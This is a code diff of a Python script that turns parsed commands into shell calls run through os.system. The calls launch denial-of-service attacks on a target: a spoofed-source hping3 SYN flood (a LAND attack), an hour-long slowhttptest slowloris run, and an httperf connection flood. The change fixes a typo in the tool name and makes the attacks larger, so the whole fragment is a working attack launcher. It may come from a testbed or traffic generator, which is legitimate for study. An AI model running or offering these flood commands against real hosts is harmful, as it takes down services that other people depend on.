@@ -59,9 +59,9 @@ def main():
             elif seglist[0][:4] == 'LAND':
                 cmd = f"for i in {{1..100000}}; do hping3 {seglist[1]} -a {seglist[1]} -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;"
             elif seglist[0][:8] == 'SLOWHTTP':
-                cmd = f"lowhttptest -H -u http://{seglist[1]} -t GET -c 500 -r 30 -p 20 -l 3600"
+                cmd = f"slowhttptest -H -u http://{seglist[1]}:{seglist[2]} -t GET -c 500 -r 30 -p 20 -l 3600"
             elif seglist[0][:8] == 'FASTHTTP':
-                cmd = f"httperf --server {seglist[1]} --port {seglist[2]} --uri / --num-conns 1000 --rate 500"
+                cmd = f"httperf --server {seglist[1]} --port {seglist[2]} --uri / --num-conns 10000 --rate 500"
 
             os.system(cmd)
 
